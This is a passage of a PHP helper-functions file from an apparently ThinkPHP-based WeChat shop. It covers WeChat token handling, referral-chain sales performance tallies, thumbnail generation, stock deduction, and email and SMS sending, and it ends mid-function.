<?php

use app\common\model\Users;
use think\Log;
use think\Db;

use app\common\logic\BonusPoolLogic;
use app\common\logic\BonusLogic;
use app\common\logic\FanliLogic;
use app\common\logic\UsersLogic;

define('EXTEND_MODULE', 1);
define('EXTEND_ANDROID', 2);
define('EXTEND_IOS', 3);
define('EXTEND_ENTRUST', 4); //委托服务
define('EXTEND_MINIAPP', 5);
define("EXTEND_H5",6);//添加终端h5
define('TIME_MOUTH', 4);


function access_token(){
    $token = M('wx_user')->find();
	
    $appid = $token['appid'];
    $appsecret = $token['appsecret'];

    //判断是否过了缓存期
    $expire_time = $token['web_expires'];

    if($expire_time > time()){
        return $token['web_access_token'];
         
    }

    $url = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid={$appid}&secret={$appsecret}";

    $return = httpRequest($url,'GET');

    $return = json_decode($return,1);
    $web_expires = time() + 7140; // 提前60秒过期
    if($return['access_token']){
        M('wx_user')->where(array('id'=>31))->save(array('web_access_token'=>$return['access_token'],'web_expires'=>$web_expires));
    }
    return $return['access_token'];
}


//二维数组排序
function towArraySort ($data,$key,$order = SORT_ASC) {
    try{
        //        dump($data);
        $last_names = array_column($data,$key);
        array_multisort($last_names,$order,$data);
//        dump($data);
        return $data;
    }catch (\Exception $e){
        return false;
    }

}

function write_log($content)
{
    $content = "[" . date('Y-m-d H:i:s') . "]" . $content . "\r\n";
    $dir = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']), '/') . '/logs';
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    $path = $dir . '/' . date('Ymd') . '.txt';
    file_put_contents($path, $content, FILE_APPEND);
}


/**
 * debug 
 */
function debug_log($content)
{
    $content = "[" . date('Y-m-d H:i:s') . "]" . $content . "\r\n";
    $dir = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']), '/') . '/debug';
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    $path = $dir . '/' . date('Ymd') . '.txt';
    file_put_contents($path, $content, FILE_APPEND);
}


function share_deal_after($xiaji, $shangji)
{
    if ($xiaji == $shangji) {
        return false;
    }
    $is_shangji = M('users')->where(['user_id' => $xiaji])->value('first_leader');
    
    if ($is_shangji != $shangji) {

        return false;
    }

    //给上级发送消息
    $shangji_openid = M('users')->where(['user_id' => $shangji])->value('openid');
    if($shangji_openid){
            $xiaji_nickname = M('users')->where(['user_id' => $xiaji])->value('nickname');
            if($xiaji_nickname == ''){

                $xiaji_nickname = get_nickname_new($xiaji);
            }
            $wx_content = "您的直属创客[" . $xiaji_nickname . "][ID:" . $xiaji . "]" . $before . "关注了公众号";

            $wechat = new \app\common\logic\wechat\WechatUtil();
            $wechat->sendMsg($shangji_openid, 'text', $wx_content);
     }
    //$res = M('users')->where(['user_id' => $xiaji])->update(['level_t'=>88,'first_leader' => $shangji]);
    /*
    if ($res) {
        $before = '成功';

        write_log("xiaji33333:" . $xiaji);
        //给上级发送消息
        $shangji_openid = M('users')->where(['user_id' => $shangji])->value('openid');
        if($shangji_openid){
             write_log("xiaji444444:" . $xiaji);
            $xiaji_nickname = M('users')->where(['user_id' => $xiaji])->value('nickname');
            if($xiaji_nickname == ''){
                  write_log("xiaji55555555:" . $xiaji);
                $xiaji_nickname = get_nickname_new($xiaji);
            }
            $wx_content = "您的直属创客[" . $xiaji_nickname . "][ID:" . $xiaji . "]" . $before . "关注了公众号";
             write_log("xiaji666666666:" . $xiaji);
            $wechat = new \app\common\logic\wechat\WechatUtil();
            $wechat->sendMsg($shangji_openid, 'text', $wx_content);
        }

    }*/


    return true;
}


//获取用户昵称
function get_nickname_new($user_id){
    $user = M('users')->where(['user_id'=>$user_id])->find();
    $access_token = access_token();
    $url = 'https://api.weixin.qq.com/cgi-bin/user/info?access_token='.$access_token.'&openid='.$user['openid'].'&lang=zh_CN';

    $resp = httpRequest($url, "GET");
    $res = json_decode($resp, true);

    if($user['nickname'] == ''){
        $data = array(
            'nickname'=>$res['nickname'],
            'head_pic'=>$res['headimgurl']
        );
        M('users')->where(['user_id'=>$user_id])->update($data);
    }

    return $res['nickname'];
}

//获取用户昵称
function is_subscribe($user_id){

//    write_log( $user_id .'-----'.session('subscribe').'……'  );

    if(session('subscribe')!==NULL){
        return session('subscribe');

    }else{

        $user = M('users')->where(['user_id'=>$user_id])->field('openid')->find();
        $access_token = access_token();
        $url = 'https://api.weixin.qq.com/cgi-bin/user/info?access_token='.$access_token.'&openid='.$user['openid'].'&lang=zh_CN';

        $resp = httpRequest($url, "GET");

        write_log(   session('user.user_id').'======'. $resp   );

        $res = json_decode($resp, true);

        if(!isset($res['subscribe'])){
            return false;
        }else{
            session('subscribe',$res['subscribe']);
//            write_log(session('subscribe').'======');
            return $res['subscribe'] == 0 ? false : true;
        }
    }
}

//获取推荐上级
function get_uper_user($data)
{
    $recUser  = getAllUp($data);
    return array('recUser'=>$recUser);
}

/*
 * 获取所有上级
 */
function getAllUp($invite_id,&$userList=array())
{           
    $field  = "user_id,first_leader,agent_user,is_lock,level";
    $UpInfo = M('users')->field($field)->where(['user_id'=>$invite_id])->find();
    if($UpInfo)  //有上级
    {
        $userList[] = $UpInfo;                                      
        getAllUp($UpInfo['first_leader'],$userList);
    }
    
    return $userList;     
    
}


/**
 * 极差代理
 * 
 * 登记等级 分钱
 */
 function jichadaili($order_id){

    $r = M('order_divide')->where(['order_id'=>$order_id])->find();

    //记录表
    if($r['status'] == 1){
        return false;
    }

    $order = M('order')->where(['order_id'=>$order_id])->find();


    // 如果 订单 小于 9.9 ，不分钱
    if((float)$order['total_amount'] <= 9.9 ){
        return false;
    }

    $userId = $order['user_id'];
    $orderSn = $order['order_sn'];

    $goods_list = M('order_goods')->where(['order_id'=>$order_id])->select();
    agent_performance($order_id);
    $num = 0;
    foreach($goods_list as $k => $v){

        $goodId = $v['goods_id'];
        $goodNum = $v['goods_num'];

        $model = new BonusLogic($userId, $goodId,$goodNum,$orderSn,$order_id);
        $res = $model->bonusModel();

        if(!$v['prom_type'] && !$v['prom_id'] && ($v['cat_id'] != C('customize.special_cid')||$v['cat_id'] != C('customize.level6_cid'))){
            $num +=  ($goodNum * $v['final_price']); 
        }
    }

    //查找订单用户上级链中的level为4或5的用户
    $UsersLogic = new \app\common\logic\UsersLogic();
    $leader = $UsersLogic->getUserLevTop($userId,4);
    $Yeji = M('yeji');
	if(!$Yeji->where(['uid'=>$userId,'order_id'=>$order_id])->count())
		$Yeji->add(['uid'=>$userId,'money'=>$num,'addtime'=>time(),'order_id'=>$order_id]);
    if($leader['user_id']){
		if(!$Yeji->where(['uid'=>$leader['user_id'],'order_id'=>$order_id])->count())
			$Yeji->add(['uid'=>$leader['user_id'],'money'=>$num,'addtime'=>time(),'order_id'=>$order_id]);
        $leader = $UsersLogic->getUserLevTop($userId,5);
        if($leader['user_id']){
			if(!$Yeji->where(['uid'=>$leader['user_id'],'order_id'=>$order_id])->count())
				$Yeji->add(['uid'=>$leader['user_id'],'money'=>$num,'addtime'=>time(),'order_id'=>$order_id]);
        }
    }

 }


 /**
  * 业绩
  */
 function agent_performance($order_id){

    $order = M('order')->where(['order_id'=>$order_id])->field('order_amount,user_id,goods_price')->find();
    $order_amount = $order['goods_price'];
    $user_id = $order['user_id'];
        $where_goods = [
           // 'og.is_send'    => 1,
            'og.prom_type' =>0,//只有普通订单才算业绩
            //'u.first_leader'=>$v['user_id'],
            //"og.goods_num" =>'>1',
            //'od.pay_status'=>1,
            'gs.sign_free_receive'=>0,
            'og.order_id'=>$order_id,
            
          ];
    $order_goods = Db::name('order_goods')->alias('og')
             ->field('og.goods_price,og.prom_type,gs.sign_free_receive,og.goods_num,gs.cat_id,og.rec_id')
             ->where($where_goods)
             ->order('og.goods_id DESC')
             ->join('goods gs','gs.goods_id=og.goods_id','LEFT')
            // ->limit($Page->firstRow,$Page->listRows)
             ->select();
    foreach($order_goods as $k=>$vs)
    {
        if($vs['cat_id'] == C('customize.special_cid')||$vs['cat_id'] == C('customize.level6_cid'))continue;
        $order_amount = $vs['goods_price'] * $vs['goods_num'];
        $rec_id=$vs['rec_id'];
    //加个人业绩(下单人)
        $cunzai = M('agent_performance')->where(['user_id'=>$user_id])->find();
        //存在
        if($cunzai){
            $data_new['ind_per'] = $cunzai['ind_per'] + $order_amount;
            $data_new['update_time'] = date('Y-m-d H:i:s');
            $res = M('agent_performance')->where(['user_id'=>$user_id])->save($data_new);

            agent_performance_log($user_id,$order_amount,$order_id,$rec_id);

        }else{

            $data['user_id'] =  $user_id;
            $data['ind_per'] =  $order_amount;
            $data['create_time'] = date('Y-m-d H:i:s');
            $data['update_time'] = date('Y-m-d H:i:s');
            $res = M('agent_performance')->add($data);

            agent_performance_log($user_id,$order_amount,$order_id,$rec_id);
        }

//        $first_leader = M('users')->where(['user_id'=>$user_id])->value('first_leader');
//        $arr = get_uper_user($first_leader);

        //2019.8.3-zxl,之前是所有上级都加绩效，现改为最近3个等级在董事以上的上级
        $arr = (new UsersLogic())->getUserLeader($user_id);

       // if($vs['cat_id']==8)
       // {
            //加 团队业绩
           foreach($arr as $k => $v){

                $cunzai = M('agent_performance')->where(['user_id'=>$v])->find();
                //存在
                if($cunzai){
                    $data11['team_per'] = $cunzai['team_per'] + $order_amount;
                    $data11['update_time'] = date('Y-m-d H:i:s');
                    $res = M('agent_performance')->where(['user_id'=>$v])->save($data11);
                }else{

                    $data1['user_id'] =  $v;
                    $data1['team_per'] =  $order_amount;
                    $data1['create_time'] = date('Y-m-d H:i:s');
                    $data1['update_time'] = date('Y-m-d H:i:s');
                    $res = M('agent_performance')->add($data1);
                }


                agent_performance_log($v,$order_amount,$order_id,$rec_id);
            }

        //}else
        /*
        {
            $agent_end=0;
            foreach($arr['recUser'] as $k => $v){
              if($agent_end==0) //判断是否已加业绩，加了就不往下加了
              {
                  if($v['level']==4 || $v['level']==5)
                  {

                    $cunzai = M('agent_performance')->where(['user_id'=>$v['user_id']])->find();
                    //存在
                    if($cunzai){
                        $data22['team_per'] = $cunzai['team_per'] + $order_amount;
                        $data22['update_time'] = date('Y-m-d H:i:s');
                        $res = M('agent_performance')->where(['user_id'=>$v['user_id']])->save($data22);
                    }else{

                        $data2['user_id'] =  $v['user_id'];
                        $data2['team_per'] =  $order_amount;
                        $data2['create_time'] = date('Y-m-d H:i:s');
                        $data2['update_time'] = date('Y-m-d H:i:s');
                        $res = M('agent_performance')->add($data2);
                    }
                    
                    agent_performance_log($v['user_id'],$order_amount,$order_id,$rec_id);
                    $agent_end =1; 
                  }
              }
              
           }
        }*/
        

    }



 }


 /**
  * 业绩
  */
 function add_agent_performance($order_id){

    $order = M('order')->where(['order_id'=>$order_id])->field('order_amount,user_id,goods_price,pay_time')->find();
    $order_amount = $order['goods_price'];
    $pay_time = $order['pay_time'];
    $user_id = $order['user_id'];
        $where_goods = [
           // 'og.is_send'    => 1,
            'og.prom_type' =>0,//只有普通订单才算业绩
            //'u.first_leader'=>$v['user_id'],
            //"og.goods_num" =>'>1',
            //'od.pay_status'=>1,
            'gs.sign_free_receive'=>0,
            'og.order_id'=>$order_id,
            
          ];
    $order_goods = Db::name('order_goods')->alias('og')
             ->field('og.goods_price,og.prom_type,gs.sign_free_receive,og.goods_num,gs.cat_id,og.rec_id')
             ->where($where_goods)
             ->order('og.goods_id DESC')
             ->join('goods gs','gs.goods_id=og.goods_id','LEFT')
            // ->limit($Page->firstRow,$Page->listRows)
             ->select();
    foreach($order_goods as $k=>$vs)
    {
        $order_amount = $vs['goods_price'] * $vs['goods_num'];
        $rec_id=$vs['rec_id'];
         $agent_performance_peason= M('agent_performance_log')->where(['user_id'=>$user_id,'order_id'=>$order_id,'ogoods_id'=>$rec_id])->find();
          //查看业绩是否已加，加了就不重复
         if(empty($agent_performance_peason)){
            //加个人业绩(下单人)
            $cunzai = M('agent_performance')->where(['user_id'=>$user_id])->find();
            //存在
            if($cunzai){
            
                $data_new['ind_per'] = $cunzai['ind_per'] + $order_amount;
                $data_new['update_time'] = date('Y-m-d H:i:s');
                $res = M('agent_performance')->where(['user_id'=>$user_id])->save($data_new);

                add_agent_performance_log($user_id,$order_amount,$order_id,$rec_id,$pay_time);
                 

            }else{

                $data['user_id'] =  $user_id;
                $data['ind_per'] =  $order_amount;
                $data['create_time'] = date('Y-m-d H:i:s');
                $data['update_time'] = date('Y-m-d H:i:s');
                $res = M('agent_performance')->add($data);

                add_agent_performance_log($user_id,$order_amount,$order_id,$rec_id,$pay_time);
            }
        }

        

        $first_leader = M('users')->where(['user_id'=>$user_id])->value('first_leader');
        $arr = get_uper_user($first_leader);

       // if($vs['cat_id']==8)
       // {
            //加 团队业绩
           foreach($arr['recUser'] as $k => $v){
              $agent_performance_team= M('agent_performance_log')->where(['user_id'=>$v['user_id'],'order_id'=>$order_id,'ogoods_id'=>$rec_id])->find();
               //查看业绩是否已加，加了就不重复
             if(empty($agent_performance_team)){
                    $cunzai = M('agent_performance')->where(['user_id'=>$v['user_id']])->find();
                    //存在
                    if($cunzai){
                        $data11['team_per'] = $cunzai['team_per'] + $order_amount;
                        $data11['update_time'] = date('Y-m-d H:i:s');
                        $res = M('agent_performance')->where(['user_id'=>$v['user_id']])->save($data11);
                    }else{

                        $data1['user_id'] =  $v['user_id'];
                        $data1['team_per'] =  $order_amount;
                        $data1['create_time'] = date('Y-m-d H:i:s');
                        $data1['update_time'] = date('Y-m-d H:i:s');
                        $res = M('agent_performance')->add($data1);
                    }

                    
                    add_agent_performance_log($v['user_id'],$order_amount,$order_id,$rec_id,$pay_time);
             }
            }

        //}else
        /*
        {
            $agent_end=0;
            foreach($arr['recUser'] as $k => $v){
              if($agent_end==0) //判断是否已加业绩，加了就不往下加了
              {
                  if($v['level']==4 || $v['level']==5)
                  {

                    $cunzai = M('agent_performance')->where(['user_id'=>$v['user_id']])->find();
                    //存在
                    if($cunzai){
                        $data22['team_per'] = $cunzai['team_per'] + $order_amount;
                        $data22['update_time'] = date('Y-m-d H:i:s');
                        $res = M('agent_performance')->where(['user_id'=>$v['user_id']])->save($data22);
                    }else{

                        $data2['user_id'] =  $v['user_id'];
                        $data2['team_per'] =  $order_amount;
                        $data2['create_time'] = date('Y-m-d H:i:s');
                        $data2['update_time'] = date('Y-m-d H:i:s');
                        $res = M('agent_performance')->add($data2);
                    }
                    
                    agent_performance_log($v['user_id'],$order_amount,$order_id,$rec_id);
                    $agent_end =1; 
                  }
              }
              
           }
        }*/
        

    }



 }




 /**
  * log
  */
function agent_performance_log($user_id,$order_amount,$order_id,$ogoods_id){

    $log = array(
        'user_id'=>$user_id,
        'money'=>$order_amount,
        'create_time'=>date('Y-m-d H:i:s'),
        'note'=>'订单'.$order_id.'业绩',
         'order_id'=>$order_id,
         'ogoods_id'=>$ogoods_id,
    );
    M('agent_performance_log')->add($log);


}

function add_agent_performance_log($user_id,$order_amount,$order_id,$ogoods_id,$pay_time){

    $log = array(
        'user_id'=>$user_id,
        'money'=>$order_amount,
        'create_time'=>date('Y-m-d H:i:s',$pay_time),
        'note'=>'订单'.$order_id.'业绩',
         'order_id'=>$order_id,
         'ogoods_id'=>$ogoods_id,
    );
    M('agent_performance_log')->add($log);


}


/**
 * 检验登陆
 * @param
 * @return bool
 */
function is_login(){
    if(isset($_SESSION['admin_id']) && $_SESSION['admin_id'] > 0){
        return $_SESSION['admin_id'];
    }else{
        return false;
    }
}
/**
 * 获取用户信息
 * @param $user_value  用户id 邮箱 手机 第三方id
 * @param int $type  类型 0 user_id查找 1 邮箱查找 2 手机查找 3 第三方唯一标识查找
 * @param string $oauth  第三方来源
 * @return mixed
 */
function get_user_info($user_value, $type = 0, $oauth = '')
{
    $map = [];
    if ($type == 0) {
        $map['user_id'] = $user_value;
    } elseif ($type == 1) {
        $map['email'] = $user_value;
    } elseif ($type == 2) {
        $map['mobile'] = $user_value;
    } elseif ($type == 3) {
        $thirdUser = Db::name('oauth_users')->where(['openid' => $user_value, 'oauth' => $oauth])->find();
        $map['user_id'] = $thirdUser['user_id'];
    } elseif ($type == 4) {
        $thirdUser = Db::name('oauth_users')->where(['unionid' => $user_value])->find();
        $map['user_id'] = $thirdUser['user_id'];
    }

    return Db::name('users')->where($map)->find();
}

/**
 *  获取规格图片
 * @param type $goods_id  商品id
 * @param type $item_id   规格id
 * @return
 */
function getGoodsSpecImg($goods_id,$item_id){
    $specImg = Db::name('spec_goods_price')->where(["goods_id"=>$goods_id,"item_id"=>$item_id])->cache(true)->value('spec_img');
    if (empty($specImg)) {
        return '';
    }

    return $specImg;
}

/**
 *  商品缩略图 给于标签调用 拿出商品表的 original_img 原始图来裁切出来的
 * @param type $goods_id  商品id
 * @param type $width     生成缩略图的宽度
 * @param type $height    生成缩略图的高度
 * @param type $item_id   规格id
 */
function goods_thum_images($goods_id, $width, $height,$item_id=0)
{

    if (empty($goods_id)) return '';
    //判断缩略图是否存在
    $path = UPLOAD_PATH."goods/thumb/$goods_id/";
    $goods_thumb_name = "goods_thumb_{$goods_id}_{$item_id}_{$width}_{$height}";

    // 这个商品 已经生成过这个比例的图片就直接返回了
    if (is_file($path . $goods_thumb_name . '.jpg')) return '/' . $path . $goods_thumb_name . '.jpg';
    if (is_file($path . $goods_thumb_name . '.jpeg')) return '/' . $path . $goods_thumb_name . '.jpeg';
    if (is_file($path . $goods_thumb_name . '.gif')) return '/' . $path . $goods_thumb_name . '.gif';
    if (is_file($path . $goods_thumb_name . '.png')) return '/' . $path . $goods_thumb_name . '.png';
    $original_img = '';//先定义空字符变量
    if($item_id){
        $original_img = Db::name('spec_goods_price')->where(["goods_id"=>$goods_id,'item_id'=>$item_id])->cache(true, 30, 'original_img_cache')->value('spec_img');

    }
    if(empty($original_img)){
        $original_img = Db::name('goods')->where("goods_id", $goods_id)->cache(true, 30, 'original_img_cache')->value('original_img');
    }


    if (empty($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }
    
    if(tpCache('oss.oss_switch')){
        $ossClient = new \app\common\logic\OssLogic;
        if (($ossUrl = $ossClient->getGoodsThumbImageUrl($original_img, $width, $height))) {
            return $ossUrl;
        }    
    } 

    $original_img = '.' . $original_img; // 相对路径
    if (!is_file($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }

    try {
        require_once 'vendor/topthink/think-image/src/Image.php';
        require_once 'vendor/topthink/think-image/src/image/Exception.php';
        if(strstr(strtolower($original_img),'.gif'))
        {
            require_once 'vendor/topthink/think-image/src/image/gif/Encoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Decoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Gif.php';
        }
        $image = \think\Image::open($original_img);

        $goods_thumb_name = $goods_thumb_name . '.' . $image->type();
        // 生成缩略图
        !is_dir($path) && mkdir($path, 0777, true);
        // 参考文章 http://www.mb5u.com/biancheng/php/php_84533.html  改动参考 http://www.thinkphp.cn/topic/13542.html
        $image->thumb($width, $height, 2)->save($path . $goods_thumb_name, NULL, 100); //按照原图的比例生成一个最大为$width*$height的缩略图并保存
        $img_url = '/' . $path . $goods_thumb_name;

        return $img_url;
    } catch (think\Exception $e) {

        return $original_img;
    }
}

/**
 * 商品相册缩略图
 */
function get_sub_images($sub_img, $goods_id, $width, $height)
{
    //判断缩略图是否存在
    $path = UPLOAD_PATH."goods/thumb/$goods_id/";
    $goods_thumb_name = "goods_sub_thumb_{$sub_img['img_id']}_{$width}_{$height}";
    
    //这个缩略图 已经生成过这个比例的图片就直接返回了
    if (is_file($path . $goods_thumb_name . '.jpg')) return '/' . $path . $goods_thumb_name . '.jpg';
    if (is_file($path . $goods_thumb_name . '.jpeg')) return '/' . $path . $goods_thumb_name . '.jpeg';
    if (is_file($path . $goods_thumb_name . '.gif')) return '/' . $path . $goods_thumb_name . '.gif';
    if (is_file($path . $goods_thumb_name . '.png')) return '/' . $path . $goods_thumb_name . '.png';

    if(tpCache('oss.oss_switch')){
        $ossClient = new \app\common\logic\OssLogic;
        if (($ossUrl = $ossClient->getGoodsAlbumThumbUrl($sub_img['image_url'], $width, $height))) {
            return $ossUrl;
        }
    }
    
    $original_img = '.' . $sub_img['image_url']; //相对路径
    if (!is_file($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }

    try {
        require_once 'vendor/topthink/think-image/src/Image.php';
        require_once 'vendor/topthink/think-image/src/image/Exception.php';
        if(strstr(strtolower($original_img),'.gif'))
        {
            require_once 'vendor/topthink/think-image/src/image/gif/Encoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Decoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Gif.php';
        }
        $image = \think\Image::open($original_img);

        $goods_thumb_name = $goods_thumb_name . '.' . $image->type();
        // 生成缩略图
        !is_dir($path) && mkdir($path, 0777, true);
        // 参考文章 http://www.mb5u.com/biancheng/php/php_84533.html  改动参考 http://www.thinkphp.cn/topic/13542.html
        $image->thumb($width, $height, 2)->save($path . $goods_thumb_name, NULL, 100); //按照原图的比例生成一个最大为$width*$height的缩略图并保存
        $img_url = '/' . $path . $goods_thumb_name;

        return $img_url;
    } catch (think\Exception $e) {

        return $original_img;
    }
}

/**
 * 刷新商品库存, 如果商品有设置规格库存, 则商品总库存 等于 所有规格库存相加
 * @param type $goods_id  商品id
 */
function refresh_stock($goods_id){
    $count = M("SpecGoodsPrice")->where("goods_id", $goods_id)->count();
    if($count == 0) return false; // 没有使用规格方式 没必要更改总库存

    $store_count = M("SpecGoodsPrice")->where("goods_id", $goods_id)->sum('store_count');
    M("Goods")->where("goods_id", $goods_id)->save(array('store_count'=>$store_count)); // 更新商品的总库存
}

/**
 * 根据 order_goods 表扣除商品库存
 * @param $order|订单对象或者数组
 * @throws \think\Exception
 */
function minus_stock($order){
    $orderGoodsArr = M('OrderGoods')->master()->where("order_id", $order['order_id'])->select();
    foreach($orderGoodsArr as $key => $val)
    {
        // 有选择规格的商品
        if(!empty($val['spec_key']))
        {   // 先到规格表里面扣除数量 再重新刷新一个 这件商品的总数量
            $SpecGoodsPrice = new \app\common\model\SpecGoodsPrice();
            $specGoodsPrice = $SpecGoodsPrice::get(['goods_id' => $val['goods_id'], 'key' => $val['spec_key']]);
            $specGoodsPrice->where(['goods_id' => $val['goods_id'], 'key' => $val['spec_key']])->setDec('store_count', $val['goods_num']);
            refresh_stock($val['goods_id']);
            if($val['prom_type'] == 6){
                db('team_goods_item')->where(['item_id' => $specGoodsPrice['item_id'], 'deleted' => 0])->setInc('sales_sum', $val['goods_num']);
            }
        }else{
            $specGoodsPrice = null;
            M('Goods')->where("goods_id", $val['goods_id'])->setDec('store_count',$val['goods_num']); // 直接扣除商品总数量
        }
        M('Goods')->where("goods_id", $val['goods_id'])->setInc('sales_sum',$val['goods_num']); // 增加商品销售量
        //更新活动商品购买量
        if ($val['prom_type'] == 1 || $val['prom_type'] == 2) {
            $GoodsPromFactory = new \app\common\logic\GoodsPromFactory();
            $goodsPromLogic = $GoodsPromFactory->makeModule($val, $specGoodsPrice);
            $prom = $goodsPromLogic->getPromModel();
            if ($prom['is_end'] == 0) {
                $tb = $val['prom_type'] == 1 ? 'flash_sale' : 'group_buy';
                M($tb)->where("id", $val['prom_id'])->setInc('buy_num', $val['goods_num']);
                M($tb)->where("id", $val['prom_id'])->setInc('order_num');
            }
        }
        //更新拼团商品购买量
        if($val['prom_type'] == 6){
            Db::name('team_activity')->where('team_id',  $val['prom_id'])->setInc('sales_sum', $val['goods_num']);
        }
        update_stock_log($order['user_id'], -$val['goods_num'], $val, $order['order_sn']);//库存日志
    }
}

/**
 * 邮件发送
 * @param $to    接收人
 * @param string $subject   邮件标题
 * @param string $content   邮件内容(html模板渲染后的内容)
 * @throws Exception
 * @throws phpmailerException
 */
function send_email($to,$subject='',$content=''){
    vendor('phpmailer.PHPMailerAutoload'); ////require_once vendor/phpmailer/PHPMailerAutoload.php';
    //判断openssl是否开启
    $openssl_funcs = get_extension_funcs('openssl');
    if(!$openssl_funcs){
        return array('status'=>-1 , 'msg'=>'请先开启openssl扩展');
    }
    $mail = new PHPMailer;
    $config = tpCache('smtp');
    $mail->CharSet  = 'UTF-8'; //设定邮件编码，默认ISO-8859-1，如果发中文此项必须设置，否则乱码
    $mail->isSMTP();
    //Enable SMTP debugging
    // 0 = off (for production use)
    // 1 = client messages
    // 2 = client and server messages
    $mail->SMTPDebug = 0;
    //调试输出格式
    //$mail->Debugoutput = 'html';
    //smtp服务器
    $mail->Host = $config['smtp_server'];
    //端口 - likely to be 25, 465 or 587
    $mail->Port = $config['smtp_port'];

    if($mail->Port == 465) $mail->SMTPSecure = 'ssl';// 使用安全协议
    //Whether to use SMTP authentication
    $mail->SMTPAuth = true;
    //用户名
    $mail->Username = $config['smtp_user'];
    //密码
    $mail->Password = $config['smtp_pwd'];
    //Set who the message is to be sent from
    $mail->setFrom($config['smtp_user']);
    //回复地址
    //$mail->addReplyTo('replyto@example.com', 'First Last');
    //接收邮件方
    if(is_array($to)){
        foreach ($to as $v){
            $mail->addAddress($v);
        }
    }else{
        $mail->addAddress($to);
    }

    $mail->isHTML(true);// send as HTML
    //标题
    $mail->Subject = $subject;
    //HTML内容转换
    $mail->msgHTML($content);
    //Replace the plain text body with one created manually
    //$mail->AltBody = 'This is a plain-text message body';
    //添加附件
    //$mail->addAttachment('images/phpmailer_mini.png');
    //send the message, check for errors
    if (!$mail->send()) {
        return array('status'=>-1 , 'msg'=>'发送失败: '.$mail->ErrorInfo);
    } else {
        return array('status'=>1 , 'msg'=>'发送成功');
    }
}

/**
 * 检测是否能够发送短信
 * @param unknown $scene
 * @return multitype:number string
 */
function checkEnableSendSms($scene)
{
    $scenes = C('SEND_SCENE');
    $sceneItem = $scenes[$scene];
    if (!$sceneItem) {
        return array("status" => -1, "msg" => "场景参数'scene'错误!");
    }
    $key = $sceneItem[2];
    $sceneName = $sceneItem[0];
    $config = tpCache('sms');
    $smsEnable = $config[$key];
    
    $isCheckRegCode = tpCache('sms.regis_sms_enable');
    if(!$isCheckRegCode || $isCheckRegCode===0){
        return array("status" => 0, "msg" => "短信验证码功能关闭, 无需校验验证码");
    }

    if (!$smsEnable) {
        return array("status" => -1, "msg" => "['$sceneName']发送短信被关闭'");
    }
    //判断是否添加"注册模板"
    $size = M('sms_template')->where("send_scene", $scene)->count('tpl_id');
    if (!$size) {
        return array("status" => -1, "msg" => "请先添加['$sceneName']短信模板");
    }
    

    return array("status"=>1,"msg"=>"可以发送短信");
}

/**
 * 发送短信逻辑
 * @param unknown $scene
 */
function sendSms($scene, $sender, $params,$unique_id=0)
{
    $smsLogic = new \app\common\logic\SmsLogic;
    return $smsLogic->sendSms($scene, $sender, $params, $unique_id);
}

/**
 * 查询快递
 * @param $postcom  快递公司编码
 * @param $getNu  快递单号
 * @return array  物流跟踪信息数组
 */
function queryExpress($postcom , $getNu) {
    $url = "https://m.kuaidi100.com/query?type=".$postcom."&postid=".$getNu."&id=1&valicode=&temp=0.49738534969422676";
    $resp = httpRequest($url,"GET");
    return json_decode($resp,true);
}

/**
 * 获取某个商品分类的 儿子 孙子  重子重孙 的 id
 * @param type $cat_id
 */
function getCatGrandson ($cat_id)
{
    $GLOBALS['catGrandson'] = array();
    $GLOBALS['category_id_arr'] = array();
    // 先把自己的id 保存起来
    $GLOBALS['catGrandson'][] = $cat_id;
    // 把整张表找出来
    $GLOBALS['category_id_arr'] = M('GoodsCategory')->cache(true,TPSHOP_CACHE_TIME)->getField('id,parent_id');
    // 先把所有儿子找出来
    $son_id_arr = M('GoodsCategory')->where("parent_id", $cat_id)->cache(true,TPSHOP_CACHE_TIME)->getField('id',true);
    foreach($son_id_arr as $k => $v)
    {
        getCatGrandson2($v);
    }
    return $GLOBALS['catGrandson'];
}

/**
 * 获取某个文章分类的 儿子 孙子  重子重孙 的 id
 * @param $cat_id
 * @return array|mixed
 */
function getArticleCatGrandson ($cat_id)
{
    $GLOBALS['ArticleCatGrandson'] = array();
    $GLOBALS['cat_id_arr'] = array();
    // 先把自己的id 保存起来
    $GLOBALS['ArticleCatGrandson'][] = $cat_id;
    // 把整张表找出来
    $GLOBALS['cat_id_arr'] = M('ArticleCat')->getField('cat_id,parent_id');
    // 先把所有儿子找出来
    $son_id_arr = M('ArticleCat')->where("parent_id", $cat_id)->getField('cat_id',true);
    foreach($son_id_arr as $k => $v)
    {
        getArticleCatGrandson2($v);
    }
    return $GLOBALS['ArticleCatGrandson'];
}

/**
 * 递归调用找到 重子重孙
 * @param type $cat_id
 */
function getCatGrandson2($cat_id)
{
    $GLOBALS['catGrandson'][] = $cat_id;
    foreach($GLOBALS['category_id_arr'] as $k => $v)
    {
        // 找到孙子
        if($v == $cat_id)
        {
            getCatGrandson2($k); // 继续找孙子
        }
    }
}


/**
 * 递归调用找到 重子重孙
 * @param type $cat_id
 */
function getArticleCatGrandson2($cat_id)
{
    $GLOBALS['ArticleCatGrandson'][] = $cat_id;
    foreach($GLOBALS['cat_id_arr'] as $k => $v)
    {
        // 找到孙子
        if($v == $cat_id)
        {
            getArticleCatGrandson2($k); // 继续找孙子
        }
    }
}

/**
 * 查看某个用户购物车中商品的数量
 * @param type $user_id
 * @param type $session_id
 * @return type 购买数量
 */
function cart_goods_num($user_id = 0,$session_id = '')
{
//    $where = " session_id = '$session_id' ";
//    $user_id && $where .= " or user_id = $user_id ";
    // 查找购物车数量
//    $cart_count =  M('Cart')->where($where)->sum('goods_num');
    $cart_count = Db::name('cart')->where(function ($query) use ($user_id, $session_id) {
        $query->where('session_id', $session_id);
        if ($user_id) {
            $query->whereOr('user_id', $user_id);
        }
    })->sum('goods_num');
